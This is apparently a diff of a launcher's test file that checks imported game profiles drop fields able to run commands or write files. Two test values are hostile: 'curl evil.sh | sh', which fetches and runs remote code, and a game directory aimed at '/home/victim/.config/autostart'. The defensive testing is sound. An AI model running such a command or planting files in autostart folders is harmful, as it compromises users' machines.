@@ -5,13 +5,15 @@ import { readImportedProfile } from '../src/core/profiles/profile-manager';
  * What a profile export is allowed to bring with it.
  *
  * A profile file gets passed around — posted in a Discord channel, attached to
- * a forum reply. Four fields reach a process or the filesystem at the next
- * launch: `preLaunchCommand` goes to a shell, `customJavaPath` chooses the
- * binary `spawn` runs, `javaArgs` is spliced into the JVM's own argument list
- * (`-XX:OnOutOfMemoryError=…` is a command), and `gameDirectory` is `mkdir`'d
- * and used as the working directory. Before this an "here's my profile"
- * attachment ran whatever its author liked, or wrote wherever it liked, on the
- * machine that opened it, with no step at which anyone was asked.
+ * a forum reply. Two of its fields reach a process at the next launch:
+ * `customJavaPath` chooses the binary `spawn` runs, and `javaArgs` is spliced
+ * into the JVM's own argument list (`-XX:OnOutOfMemoryError=…` is a command).
+ * Before this an "here's my profile" attachment ran whatever its author liked
+ * on the machine that opened it, with no step at which anyone was asked.
+ *
+ * The last case here is the other half of that rule: a field the schema does
+ * not declare never reaches a profile at all, which is what keeps an export
+ * from resurrecting one the launcher has since dropped.
  */
 
 const exported = {
@@ -39,12 +41,6 @@ describe('readImportedProfile', () => {
     });
   });
 
-  it('never carries a pre-launch command across', () => {
-    const { data, dropped } = importOf({ preLaunchCommand: 'curl evil.sh | sh' });
-    expect(data).not.toHaveProperty('preLaunchCommand');
-    expect(dropped).toContain('preLaunchCommand');
-  });
-
   it('never carries a custom Java path across', () => {
     const { data, dropped } = importOf({ customJavaPath: '/tmp/not-a-jvm' });
     expect(data).not.toHaveProperty('customJavaPath');
@@ -59,12 +55,6 @@ describe('readImportedProfile', () => {
     });
     expect(data).not.toHaveProperty('javaArgs');
     expect(dropped).toContain('javaArgs');
-  });
-
-  it('never carries a game directory across', () => {
-    const { data, dropped } = importOf({ gameDirectory: '/home/victim/.config/autostart' });
-    expect(data).not.toHaveProperty('gameDirectory');
-    expect(dropped).toContain('gameDirectory');
   });
 
   it('reports nothing dropped for an ordinary profile', () => {
@@ -82,6 +72,19 @@ describe('readImportedProfile', () => {
   it('does not let unknown fields ride along', () => {
     const { data } = importOf({ somethingElse: 'x' });
     expect(data).not.toHaveProperty('somethingElse');
+  });
+
+  it('cannot be made to revive a field the launcher has dropped', () => {
+    // Both were real fields once, and both reached a shell or the filesystem.
+    // Nothing declares them now, so the parse leaves them behind without
+    // needing a rule of their own — which is what makes removing a field a
+    // complete removal rather than a missing UI.
+    const { data } = importOf({
+      preLaunchCommand: 'curl evil.sh | sh',
+      gameDirectory: '/home/victim/.config/autostart',
+    });
+    expect(data).not.toHaveProperty('preLaunchCommand');
+    expect(data).not.toHaveProperty('gameDirectory');
   });
 
   it('rejects a file that is not a profile', () => {
